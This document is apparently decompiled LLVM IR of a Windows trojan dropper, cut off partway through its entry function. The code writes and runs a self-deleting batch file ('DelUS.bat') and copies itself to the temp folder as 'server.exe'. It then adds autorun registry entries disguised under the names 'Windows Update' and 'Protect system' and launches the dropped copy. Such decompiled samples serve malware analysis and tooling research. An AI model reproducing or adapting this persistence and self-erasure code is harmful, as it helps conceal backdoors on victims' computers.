source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%_OVERLAPPED = type { i32, i32, i32, i32* }

@global_var_13141008 = constant [10 x i8] c"DelUS.bat\00"
@global_var_13141019 = constant [10 x i8] c":Repeat\0D\0A\00"
@global_var_13141023 = constant [6 x i8] c"del \22\00"
@global_var_1314102b = constant [13 x i8] c"\0D\0Aif exist \22\00"
@global_var_13141038 = constant [16 x i8] c"\22 goto Repeat\0D\0A\00"
@global_var_13141048 = constant [8 x i8] c"rmdir \22\00"
@global_var_13141050 = constant [9 x i8] c"\22\0D\0Adel \22\00"
@global_var_13141059 = constant [4 x i8] c"\22\0D\0A\00"
@global_var_13141012 = constant [5 x i8] c"open\00"
@global_var_13143025 = constant [11 x i8] c"server.exe\00"
@global_var_13143051 = constant [11 x i8] c"readme.txt\00"
@global_var_131434f8 = local_unnamed_addr global i32 0
@global_var_13143e20 = local_unnamed_addr global i32 0
@global_var_13143e70 = local_unnamed_addr global i32 0
@global_var_13143ec0 = local_unnamed_addr global i32 0
@global_var_13143e1c = local_unnamed_addr global i32 0
@global_var_1314308a = local_unnamed_addr global i32 1
@global_var_1314309a = local_unnamed_addr global i32 0
@global_var_13144028 = global i32 0
@global_var_131430c8 = constant [46 x i8] c"SOFTWARE\5CMicrosoft\5CWindows\5CCurrentVersion\5CRun\00"
@global_var_1314309e = constant [15 x i8] c"Protect system\00"
@global_var_13143092 = local_unnamed_addr global i32 1
@global_var_13143086 = constant [4 x i8] c"exe\00"
@global_var_13143000 = constant [5 x i8] c"open\00"
@global_var_1314308e = local_unnamed_addr global i32 253
@global_var_131430b3 = constant [15 x i8] c"Windows Update\00"
@global_var_13143096 = local_unnamed_addr global i32 253
@global_var_13143614 = local_unnamed_addr global i32 0
@global_var_1314307e = local_unnamed_addr global i32 0
@global_var_13143f10 = local_unnamed_addr global i32 0
@global_var_13143618 = global i32 0
@global_var_131435e8 = local_unnamed_addr global i32 0
@global_var_1314300b = local_unnamed_addr global i32 0
@global_var_131435ec = local_unnamed_addr global i32 0
@global_var_1314301f = global i32 0
@global_var_13143548 = global i32 0
@0 = external global i32
@1 = internal constant [2 x i8] c"\22\00"
@2 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_13143b1c = external global i8*
@global_var_13143c1c = external global i8*
@global_var_13143d1c = external global i8*
@3 = internal constant [2 x i8] c"\5C\00"
@4 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0)
@global_var_13143a1c = external global i8*
@global_var_13143f24 = external global i8*
@global_var_1314307d = global i8 0
@global_var_131430f8 = local_unnamed_addr global i8 0
@global_var_13141029 = constant [2 x i8] c"\22\00"
@global_var_13143023 = global [2 x i8] c"\5C\00"

define i32 @function_13141000() local_unnamed_addr {
dec_label_pc_13141000:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_1314105d(i32 %0), !insn.addr !0
  ret i32 %1, !insn.addr !0
}

define i32 @function_1314105b() local_unnamed_addr {
dec_label_pc_1314105b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1
}

define i32 @function_1314105d(i32 %arg1) local_unnamed_addr {
dec_label_pc_1314105d:
  %esp.0.reg2mem = alloca i32, !insn.addr !2
  %edx.0.reg2mem = alloca i32, !insn.addr !2
  %ecx.0.reg2mem = alloca i32, !insn.addr !2
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-56 = alloca i8*, align 4
  %1 = call i32* @GetProcessHeap(), !insn.addr !2
  %2 = ptrtoint i32* %1 to i32, !insn.addr !2
  %3 = add i32 %0, -12, !insn.addr !3
  %4 = inttoptr i32 %3 to i32*, !insn.addr !3
  store i32 %2, i32* %4, align 4, !insn.addr !3
  %5 = call i32* @HeapAlloc(i32* %1, i32 0, i32 2040), !insn.addr !4
  %6 = ptrtoint i32* %5 to i32, !insn.addr !4
  %7 = add i32 %0, -20, !insn.addr !5
  %8 = inttoptr i32 %7 to i32*, !insn.addr !5
  %9 = add i32 %6, 260, !insn.addr !6
  store i32 %9, i32* %8, align 4, !insn.addr !7
  %10 = add i32 %6, 520, !insn.addr !8
  %11 = add i32 %0, -16, !insn.addr !9
  %12 = inttoptr i32 %11 to i32*, !insn.addr !9
  store i32 %10, i32* %12, align 4, !insn.addr !9
  %13 = add i32 %6, 780, !insn.addr !10
  %14 = add i32 %0, -24, !insn.addr !11
  %15 = inttoptr i32 %14 to i32*, !insn.addr !11
  store i32 %13, i32* %15, align 4, !insn.addr !11
  %16 = add i32 %6, 1040, !insn.addr !12
  %17 = add i32 %0, -28, !insn.addr !13
  %18 = inttoptr i32 %17 to i32*, !insn.addr !13
  store i32 %16, i32* %18, align 4, !insn.addr !13
  %19 = load i32, i32* %15, align 4, !insn.addr !14
  %20 = inttoptr i32 %19 to i8*, !insn.addr !14
  %21 = call i32 @GetTempPathA(i32 260, i8* %20), !insn.addr !15
  %22 = load i32, i32* %15, align 4, !insn.addr !16
  %23 = inttoptr i32 %22 to i8*, !insn.addr !16
  %24 = call i8* @lstrcatA(i8* %23, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_13141008, i32 0, i32 0)), !insn.addr !17
  %25 = load i32, i32* %15, align 4, !insn.addr !18
  %26 = inttoptr i32 %25 to i8*, !insn.addr !18
  store i8* %26, i8** %stack_var_-56, align 4, !insn.addr !18
  %27 = ptrtoint i8** %stack_var_-56 to i32, !insn.addr !18
  %28 = call i32* @CreateFileA(i8* %26, i32 1073741824, i32 0, %_SECURITY_ATTRIBUTES* null, i32 2, i32 134217856, i32* null), !insn.addr !19
  %29 = ptrtoint i32* %28 to i32, !insn.addr !19
  %30 = add i32 %0, -4, !insn.addr !20
  %31 = inttoptr i32 %30 to i32*, !insn.addr !20
  store i32 %29, i32* %31, align 4, !insn.addr !20
  %32 = icmp eq i32* %28, inttoptr (i32 -1 to i32*), !insn.addr !21
  store i32 %27, i32* %esp.0.reg2mem, !insn.addr !22
  br i1 %32, label %dec_label_pc_131411d8, label %dec_label_pc_131410d8, !insn.addr !22

dec_label_pc_131410d8:                            ; preds = %dec_label_pc_1314105d
  %33 = load i32, i32* %12, align 4, !insn.addr !23
  %34 = inttoptr i32 %33 to i8*, !insn.addr !23
  %35 = call i32 @GetModuleFileNameA(i32* null, i8* %34, i32 260), !insn.addr !24
  %36 = load i32, i32* %12, align 4, !insn.addr !25
  %37 = inttoptr i32 %36 to i8*, !insn.addr !25
  %38 = load i32, i32* %8, align 4, !insn.addr !26
  %39 = inttoptr i32 %38 to i8*, !insn.addr !26
  %40 = call i8* @lstrcpyA(i8* %39, i8* %37), !insn.addr !27
  %41 = load i32, i32* %8, align 4, !insn.addr !28
  store i32 %41, i32* %ecx.0.reg2mem, !insn.addr !29
  store i32 %41, i32* %edx.0.reg2mem, !insn.addr !29
  br label %dec_label_pc_131410f7, !insn.addr !29

dec_label_pc_131410f7:                            ; preds = %dec_label_pc_131410f7, %dec_label_pc_131410d8
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %42 = inttoptr i32 %edx.0.reload to i8*, !insn.addr !30
  %43 = load i8, i8* %42, align 1, !insn.addr !30
  %44 = icmp eq i8 %43, 92, !insn.addr !31
  %45 = icmp eq i1 %44, false, !insn.addr !32
  %spec.select = select i1 %45, i32 %ecx.0.reload, i32 %edx.0.reload
  %46 = add i32 %edx.0.reload, 1, !insn.addr !33
  %47 = icmp eq i8 %43, 0, !insn.addr !34
  %48 = icmp eq i1 %47, false, !insn.addr !35
  store i32 %spec.select, i32* %ecx.0.reg2mem, !insn.addr !35
  store i32 %46, i32* %edx.0.reg2mem, !insn.addr !35
  br i1 %48, label %dec_label_pc_131410f7, label %dec_label_pc_13141104, !insn.addr !35

dec_label_pc_13141104:                            ; preds = %dec_label_pc_131410f7
  %49 = add i32 %spec.select, 1, !insn.addr !36
  %50 = inttoptr i32 %49 to i8*, !insn.addr !36
  store i8 0, i8* %50, align 1, !insn.addr !36
  %51 = load i32, i32* %18, align 4, !insn.addr !37
  %52 = inttoptr i32 %51 to i8*, !insn.addr !37
  %53 = call i8* @lstrcatA(i8* %52, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_13141019, i32 0, i32 0)), !insn.addr !38
  %54 = load i32, i32* %18, align 4, !insn.addr !39
  %55 = inttoptr i32 %54 to i8*, !insn.addr !39
  %56 = call i8* @lstrcatA(i8* %55, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_13141023, i32 0, i32 0)), !insn.addr !40
  %57 = load i32, i32* %12, align 4, !insn.addr !41
  %58 = inttoptr i32 %57 to i8*, !insn.addr !41
  %59 = load i32, i32* %18, align 4, !insn.addr !42
  %60 = inttoptr i32 %59 to i8*, !insn.addr !42
  %61 = call i8* @lstrcatA(i8* %60, i8* %58), !insn.addr !43
  %62 = load i32, i32* %18, align 4, !insn.addr !44
  %63 = inttoptr i32 %62 to i8*, !insn.addr !44
  %64 = call i8* @lstrcatA(i8* %63, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_13141029, i32 0, i32 0)), !insn.addr !45
  %65 = load i32, i32* %18, align 4, !insn.addr !46
  %66 = inttoptr i32 %65 to i8*, !insn.addr !46
  %67 = call i8* @lstrcatA(i8* %66, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1314102b, i32 0, i32 0)), !insn.addr !47
  %68 = load i32, i32* %12, align 4, !insn.addr !48
  %69 = inttoptr i32 %68 to i8*, !insn.addr !48
  %70 = load i32, i32* %18, align 4, !insn.addr !49
  %71 = inttoptr i32 %70 to i8*, !insn.addr !49
  %72 = call i8* @lstrcatA(i8* %71, i8* %69), !insn.addr !50
  %73 = load i32, i32* %18, align 4, !insn.addr !51
  %74 = inttoptr i32 %73 to i8*, !insn.addr !51
  %75 = call i8* @lstrcatA(i8* %74, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_13141038, i32 0, i32 0)), !insn.addr !52
  %76 = load i32, i32* %18, align 4, !insn.addr !53
  %77 = inttoptr i32 %76 to i8*, !insn.addr !53
  %78 = call i8* @lstrcatA(i8* %77, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_13141048, i32 0, i32 0)), !insn.addr !54
  %79 = load i32, i32* %8, align 4, !insn.addr !55
  %80 = inttoptr i32 %79 to i8*, !insn.addr !55
  %81 = load i32, i32* %18, align 4, !insn.addr !56
  %82 = inttoptr i32 %81 to i8*, !insn.addr !56
  %83 = call i8* @lstrcatA(i8* %82, i8* %80), !insn.addr !57
  %84 = load i32, i32* %18, align 4, !insn.addr !58
  %85 = inttoptr i32 %84 to i8*, !insn.addr !58
  %86 = call i8* @lstrcatA(i8* %85, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_13141050, i32 0, i32 0)), !insn.addr !59
  %87 = load i32, i32* %15, align 4, !insn.addr !60
  %88 = inttoptr i32 %87 to i8*, !insn.addr !60
  %89 = load i32, i32* %18, align 4, !insn.addr !61
  %90 = inttoptr i32 %89 to i8*, !insn.addr !61
  %91 = call i8* @lstrcatA(i8* %90, i8* %88), !insn.addr !62
  %92 = load i32, i32* %18, align 4, !insn.addr !63
  %93 = inttoptr i32 %92 to i8*, !insn.addr !63
  %94 = call i8* @lstrcatA(i8* %93, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_13141059, i32 0, i32 0)), !insn.addr !64
  %95 = load i32, i32* %18, align 4, !insn.addr !65
  %96 = inttoptr i32 %95 to i8*, !insn.addr !65
  %97 = call i32 @lstrlenA(i8* %96), !insn.addr !66
  %98 = add i32 %0, -8, !insn.addr !67
  %99 = inttoptr i32 %98 to i32*, !insn.addr !67
  store i32 %97, i32* %99, align 4, !insn.addr !67
  %100 = load i32, i32* %18, align 4, !insn.addr !68
  %101 = load i32, i32* %31, align 4, !insn.addr !69
  %102 = inttoptr i32 %101 to i32*, !insn.addr !70
  %103 = inttoptr i32 %100 to i32*, !insn.addr !70
  %104 = call i1 @WriteFile(i32* %102, i32* %103, i32 %97, i32* %99, %_OVERLAPPED* null), !insn.addr !70
  %105 = load i32, i32* %31, align 4, !insn.addr !71
  %106 = inttoptr i32 %105 to i32*, !insn.addr !72
  %107 = call i1 @CloseHandle(i32* %106), !insn.addr !72
  %108 = load i32, i32* %15, align 4, !insn.addr !73
  %109 = inttoptr i32 %108 to i8*, !insn.addr !73
  store i32 0, i32* %stack_var_-224, align 4, !insn.addr !74
  %110 = ptrtoint i32* %stack_var_-224 to i32, !insn.addr !74
  %111 = call i32* @ShellExecuteA(i32* null, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_13141012, i32 0, i32 0), i8* %109, i8* null, i8* null, i32 0), !insn.addr !75
  store i32 %110, i32* %esp.0.reg2mem, !insn.addr !75
  br label %dec_label_pc_131411d8, !insn.addr !75

dec_label_pc_131411d8:                            ; preds = %dec_label_pc_13141104, %dec_label_pc_1314105d
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %112 = load i32, i32* %8, align 4, !insn.addr !76
  %113 = add i32 %esp.0.reload, -4, !insn.addr !76
  %114 = inttoptr i32 %113 to i32*, !insn.addr !76
  store i32 %112, i32* %114, align 4, !insn.addr !76
  %115 = add i32 %esp.0.reload, -8, !insn.addr !77
  %116 = inttoptr i32 %115 to i32*, !insn.addr !77
  store i32 0, i32* %116, align 4, !insn.addr !77
  %117 = load i32, i32* %4, align 4, !insn.addr !78
  %118 = add i32 %esp.0.reload, -12, !insn.addr !78
  %119 = inttoptr i32 %118 to i32*, !insn.addr !78
  store i32 %117, i32* %119, align 4, !insn.addr !78
  %120 = call i1 @HeapFree(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !79
  %121 = sext i1 %120 to i32, !insn.addr !79
  ret i32 %121, !insn.addr !80
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_131411e7:
  %esp.3.reg2mem = alloca i32, !insn.addr !81
  %esp.2.reg2mem = alloca i32, !insn.addr !81
  %esp.1.reg2mem = alloca i32, !insn.addr !81
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !81
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %0 = call i32 @GetCurrentDirectoryA(i32 256, i8* bitcast (i8** @global_var_13143b1c to i8*)), !insn.addr !82
  %1 = call i32 @GetTempPathA(i32 256, i8* bitcast (i8** @global_var_13143c1c to i8*)), !insn.addr !83
  %2 = call i32 @GetTempPathA(i32 256, i8* bitcast (i8** @global_var_13143d1c to i8*)), !insn.addr !84
  %3 = call i8* @lstrcatA(i8* bitcast (i8** @global_var_13143b1c to i8*), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_13143023, i32 0, i32 0)), !insn.addr !85
  %4 = call i8* @lstrcatA(i8* bitcast (i8** @global_var_13143b1c to i8*), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_13143025, i32 0, i32 0)), !insn.addr !86
  %5 = call i8* @lstrcatA(i8* bitcast (i8** @global_var_13143c1c to i8*), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_13143051, i32 0, i32 0)), !insn.addr !87
  %6 = call i8* @lstrcatA(i8* bitcast (i8** @global_var_13143d1c to i8*), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_13143025, i32 0, i32 0)), !insn.addr !88
  %7 = call i1 @DeleteFileA(i8* bitcast (i8** @global_var_13143b1c to i8*)), !insn.addr !89
  %8 = call i1 @DeleteFileA(i8* bitcast (i8** @global_var_13143c1c to i8*)), !insn.addr !90
  %9 = call i1 @DeleteFileA(i8* bitcast (i8** @global_var_13143d1c to i8*)), !insn.addr !91
  store i32 0, i32* %stack_var_-80, align 4, !insn.addr !92
  %10 = call i32 @GetModuleFileNameA(i32* null, i8* bitcast (i8** @global_var_13143a1c to i8*), i32 256), !insn.addr !93
  store i32 6500, i32* @global_var_131434f8, align 4, !insn.addr !94
  %11 = call i32 @function_13141605(), !insn.addr !95
  %12 = load i32, i32* @global_var_131434f8, align 4, !insn.addr !96
  store i32 %12, i32* @global_var_13143e20, align 4, !insn.addr !97
  store i32 10000, i32* @global_var_131434f8, align 4, !insn.addr !98
  %13 = call i32 @function_13141605(), !insn.addr !99
  %14 = load i32, i32* @global_var_131434f8, align 4, !insn.addr !100
  store i32 %14, i32* @global_var_13143e70, align 4, !insn.addr !101
  %15 = add i32 %14, -8, !insn.addr !102
  store i32 %15, i32* @global_var_13143ec0, align 4, !insn.addr !103
  store i32 1, i32* @global_var_13143e1c, align 4, !insn.addr !104
  %16 = call i32 @function_131414c1(), !insn.addr !105
  %17 = load i32, i32* @global_var_1314308a, align 4, !insn.addr !106
  %18 = icmp eq i32 %17, 1, !insn.addr !106
  %19 = icmp eq i1 %18, false, !insn.addr !107
  store i32* %stack_var_-80, i32** %esp.0.in.reg2mem, !insn.addr !107
  br i1 %19, label %dec_label_pc_13141372, label %dec_label_pc_131412df, !insn.addr !107

dec_label_pc_131412df:                            ; preds = %dec_label_pc_131411e7
  %20 = load i32, i32* @global_var_1314309a, align 4, !insn.addr !108
  %21 = icmp eq i32 %20, 1, !insn.addr !108
  %22 = call i32 @RegOpenKeyExA(i32* inttoptr (i32 -2147483646 to i32*), i8* getelementptr inbounds ([46 x i8], [46 x i8]* @global_var_131430c8, i32 0, i32 0), i32 0, i32 131078, i32** bitcast (i32* @global_var_13144028 to i32**))
  %23 = load i32, i32* @global_var_13144028, align 4
  %24 = inttoptr i32 %23 to i32*
  br i1 %21, label %dec_label_pc_1314132e, label %dec_label_pc_131412e8, !insn.addr !109

dec_label_pc_131412e8:                            ; preds = %dec_label_pc_131412df
  %25 = call i32 @RegSetValueExA(i32* %24, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1314309e, i32 0, i32 0), i32 0, i32 1, i8* bitcast (i8** @global_var_13143d1c to i8*), i32 161), !insn.addr !110
  %26 = load i32, i32* @global_var_13144028, align 4, !insn.addr !111
  store i32 %26, i32* %stack_var_-128, align 4, !insn.addr !111
  %27 = inttoptr i32 %26 to i32*, !insn.addr !112
  %28 = call i32 @RegCloseKey(i32* %27), !insn.addr !112
  store i32* %stack_var_-128, i32** %esp.0.in.reg2mem, !insn.addr !113
  br label %dec_label_pc_13141372, !insn.addr !113

dec_label_pc_1314132e:                            ; preds = %dec_label_pc_131412df
  %29 = call i32 @RegSetValueExA(i32* %24, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1314309e, i32 0, i32 0), i32 0, i32 1, i8* bitcast (i8** @global_var_13143b1c to i8*), i32 161), !insn.addr !114
  %30 = load i32, i32* @global_var_13144028, align 4, !insn.addr !115
  store i32 %30, i32* %stack_var_-128, align 4, !insn.addr !115
  %31 = inttoptr i32 %30 to i32*, !insn.addr !116
  %32 = call i32 @RegCloseKey(i32* %31), !insn.addr !116
  store i32* %stack_var_-128, i32** %esp.0.in.reg2mem, !insn.addr !116
  br label %dec_label_pc_13141372, !insn.addr !116

dec_label_pc_13141372:                            ; preds = %dec_label_pc_1314132e, %dec_label_pc_131412e8, %dec_label_pc_131411e7
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %33 = add i32 %esp.0, -4, !insn.addr !117
  %34 = inttoptr i32 %33 to i32*, !insn.addr !117
  store i32 0, i32* %34, align 4, !insn.addr !117
  %35 = add i32 %esp.0, -8, !insn.addr !118
  %36 = inttoptr i32 %35 to i32*, !insn.addr !118
  store i32 ptrtoint (i8** @global_var_13143d1c to i32), i32* %36, align 4, !insn.addr !118
  %37 = add i32 %esp.0, -12, !insn.addr !119
  %38 = inttoptr i32 %37 to i32*, !insn.addr !119
  store i32 ptrtoint (i8** @global_var_13143b1c to i32), i32* %38, align 4, !insn.addr !119
  %39 = call i1 @CopyFileA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !120
  %40 = load i32, i32* @global_var_1314309a, align 4, !insn.addr !121
  %41 = icmp eq i32 %40, 0, !insn.addr !121
  %42 = icmp eq i1 %41, false, !insn.addr !122
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !122
  br i1 %42, label %dec_label_pc_13141396, label %dec_label_pc_1314138c, !insn.addr !122

dec_label_pc_1314138c:                            ; preds = %dec_label_pc_13141372
  %43 = add i32 %esp.0, -16, !insn.addr !123
  %44 = inttoptr i32 %43 to i32*, !insn.addr !123
  store i32 ptrtoint (i8** @global_var_13143b1c to i32), i32* %44, align 4, !insn.addr !123
  %45 = call i1 @DeleteFileA(i8* bitcast (i32* @0 to i8*)), !insn.addr !124
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !124
  br label %dec_label_pc_13141396, !insn.addr !124

dec_label_pc_13141396:                            ; preds = %dec_label_pc_1314138c, %dec_label_pc_13141372
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = load i32, i32* @global_var_13143092, align 4, !insn.addr !125
  %47 = icmp eq i32 %46, 1, !insn.addr !125
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !126
  br i1 %47, label %dec_label_pc_131413a3, label %dec_label_pc_131413e0, !insn.addr !126

dec_label_pc_131413a3:                            ; preds = %dec_label_pc_13141396
  %48 = call i32 @function_1314171f(), !insn.addr !127
  %49 = add i32 %esp.1.reload, -4, !insn.addr !128
  %50 = inttoptr i32 %49 to i32*, !insn.addr !128
  store i32 ptrtoint ([4 x i8]* @global_var_13143086 to i32), i32* %50, align 4, !insn.addr !128
  %51 = add i32 %esp.1.reload, -8, !insn.addr !129
  %52 = inttoptr i32 %51 to i32*, !insn.addr !129
  store i32 ptrtoint (i8** @global_var_13143f24 to i32), i32* %52, align 4, !insn.addr !129
  %53 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !130
  %54 = icmp eq i32 %53, 0, !insn.addr !131
  %55 = add i32 %esp.1.reload, -12
  %56 = inttoptr i32 %55 to i32*
  store i32 5, i32* %56, align 4
  %57 = add i32 %esp.1.reload, -16
  %58 = inttoptr i32 %57 to i32*
  br i1 %54, label %dec_label_pc_131413d4, label %dec_label_pc_131413bb, !insn.addr !132

dec_label_pc_131413bb:                            ; preds = %dec_label_pc_131413a3
  store i32 0, i32* %58, align 4, !insn.addr !133
  %59 = add i32 %esp.1.reload, -20, !insn.addr !134
  %60 = inttoptr i32 %59 to i32*, !insn.addr !134
  store i32 0, i32* %60, align 4, !insn.addr !134
  %61 = add i32 %esp.1.reload, -24, !insn.addr !135
  %62 = inttoptr i32 %61 to i32*, !insn.addr !135
  store i32 ptrtoint (i8** @global_var_13143d1c to i32), i32* %62, align 4, !insn.addr !135
  %63 = add i32 %esp.1.reload, -28, !insn.addr !136
  %64 = inttoptr i32 %63 to i32*, !insn.addr !136
  store i32 ptrtoint ([5 x i8]* @global_var_13143000 to i32), i32* %64, align 4, !insn.addr !136
  %65 = add i32 %esp.1.reload, -32, !insn.addr !137
  %66 = inttoptr i32 %65 to i32*, !insn.addr !137
  store i32 0, i32* %66, align 4, !insn.addr !137
  %67 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !138
  store i32 %65, i32* %esp.2.reg2mem, !insn.addr !139
  br label %dec_label_pc_131413e0, !insn.addr !139

dec_label_pc_131413d4:                            ; preds = %dec_label_pc_131413a3
  store i32 ptrtoint (i8** @global_var_13143d1c to i32), i32* %58, align 4, !insn.addr !140
  %68 = call i32 @WinExec(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !141
  store i32 %57, i32* %esp.2.reg2mem, !insn.addr !141
  br label %dec_label_pc_131413e0, !insn.addr !141

dec_label_pc_131413e0:                            ; preds = %dec_label_pc_13141396, %dec_label_pc_131413d4, %dec_label_pc_131413bb
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  store i32 2, i32* @global_var_13143e1c, align 4, !insn.addr !142
  %69 = call i32 @function_131414c1(), !insn.addr !143
  %70 = load i32, i32* @global_var_1314308e, align 4, !insn.addr !144
  %71 = icmp eq i32 %70, 1, !insn.addr !144
  %72 = icmp eq i1 %71, false, !insn.addr !145
  store i32 %esp.2.reload, i32* %esp.3.reg2mem, !insn.addr !145
  br i1 %72, label %dec_label_pc_1314143c, label %dec_label_pc_131413f8, !insn.addr !145

dec_label_pc_131413f8:                            ; preds = %dec_label_pc_131413e0
  %73 = add i32 %esp.2.reload, -4, !insn.addr !146
  %74 = inttoptr i32 %73 to i32*, !insn.addr !146
  store i32 ptrtoint (i32* @global_var_13144028 to i32), i32* %74, align 4, !insn.addr !146
  %75 = add i32 %esp.2.reload, -8, !insn.addr !147
  %76 = inttoptr i32 %75 to i32*, !insn.addr !147
  store i32 131078, i32* %76, align 4, !insn.addr !147
  %77 = add i32 %esp.2.reload, -12, !insn.addr !148
  %78 = inttoptr i32 %77 to i32*, !insn.addr !148
  store i32 0, i32* %78, align 4, !insn.addr !148
  %79 = add i32 %esp.2.reload, -16, !insn.addr !149
  %80 = inttoptr i32 %79 to i32*, !insn.addr !149
  store i32 ptrtoint ([46 x i8]* @global_var_131430c8 to i32), i32* %80, align 4, !insn.addr !149
  %81 = add i32 %esp.2.reload, -20, !insn.addr !150
  %82 = inttoptr i32 %81 to i32*, !insn.addr !150
  store i32 -2147483646, i32* %82, align 4, !insn.addr !150
  %83 = call i32 @RegOpenKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32** bitcast (i32* @0 to i32**)), !insn.addr !151
  %84 = add i32 %esp.2.reload, -24, !insn.addr !152
  %85 = inttoptr i32 %84 to i32*, !insn.addr !152
  store i32 161, i32* %85, align 4, !insn.addr !152
  %86 = add i32 %esp.2.reload, -28, !insn.addr !153
  %87 = inttoptr i32 %86 to i32*, !insn.addr !153
  store i32 ptrtoint (i8** @global_var_13143c1c to i32), i32* %87, align 4, !insn.addr !153
  %88 = add i32 %esp.2.reload, -32, !insn.addr !154
  %89 = inttoptr i32 %88 to i32*, !insn.addr !154
  store i32 1, i32* %89, align 4, !insn.addr !154
  %90 = add i32 %esp.2.reload, -36, !insn.addr !155
  %91 = inttoptr i32 %90 to i32*, !insn.addr !155
  store i32 0, i32* %91, align 4, !insn.addr !155
  %92 = add i32 %esp.2.reload, -40, !insn.addr !156
  %93 = inttoptr i32 %92 to i32*, !insn.addr !156
  store i32 ptrtoint ([15 x i8]* @global_var_131430b3 to i32), i32* %93, align 4, !insn.addr !156
  %94 = load i32, i32* @global_var_13144028, align 4, !insn.addr !157
  %95 = add i32 %esp.2.reload, -44, !insn.addr !157
  %96 = inttoptr i32 %95 to i32*, !insn.addr !157
  store i32 %94, i32* %96, align 4, !insn.addr !157
  %97 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !158
  %98 = load i32, i32* @global_var_13144028, align 4, !insn.addr !159
  %99 = add i32 %esp.2.reload, -48, !insn.addr !159
  %100 = inttoptr i32 %99 to i32*, !insn.addr !159
  store i32 %98, i32* %100, align 4, !insn.addr !159
  %101 = call i32 @RegCloseKey(i32* nonnull @0), !insn.addr !160
  store i32 %99, i32* %esp.3.reg2mem, !insn.addr !160
  br label %dec_label_pc_1314143c, !insn.addr !160

dec_label_pc_1314143c:                            ; preds = %dec_label_pc_131413f8, %dec_label_pc_131413e0
  %esp.3.reload = load i32, i32* %esp.3.reg2mem
  %102 = load i32, i32* @global_var_13143096, align 4, !insn.addr !161
  %103 = icmp eq i32 %102, 1, !insn.addr !161
  br i1 %103, label %dec_label_pc_1314145c, label %dec_label_pc_13141445, !insn.addr !162

dec_label_pc_13141445:                            ; preds = %dec_label_pc_1314143c
  %104 = load i32, i32* @global_var_1314309a, align 4, !insn.addr !163
  %105 = icmp eq i32 %104, 1, !insn.addr !163
  %106 = icmp eq i1 %105, false, !insn.addr !164
  br i1 %106, label %dec_label_pc_13141453, label %dec_label_pc_1314144e, !insn.addr !164

dec_label_pc_1314144e:                            ; preds = %dec_label_pc_13141445
  %107 = call i32 @function_13141000(), !insn.addr !165
  br label %dec_label_pc_13141453, !insn.addr !165

dec_label_pc_13141453:                            ; preds = %dec_label_pc_1314144e, %dec_label_pc_13141445
  %108 = add i32 %esp.3.reload, -4, !insn.addr !166
  %109 = inttoptr i32 %108 to i32*, !insn.addr !166
  store i32 0, i32* %109, align 4, !insn.addr !166
  call void @ExitProcess(i32 ptrtoint (i32* @0 to i32)), !insn.addr !167
  unreachable, !insn.addr !167

dec_label_pc_1314145c:                            ; preds = %dec_label_pc_1314143c
  %110 = call i32 @function_1314171f(), !insn.addr !168
  %111 = add i32 %esp.3.reload, -4, !insn.addr !169
  %112 = inttoptr i32 %111 to i32*, !insn.addr !169
  store i32 ptrtoint ([4 x i8]* @global_var_13143086 to i32), i32* %112, align 4, !insn.addr !169
  %113 = add i32 %esp.3.reload, -8, !insn.addr !170
  %114 = inttoptr i32 %113 to i32*, !insn.addr !170
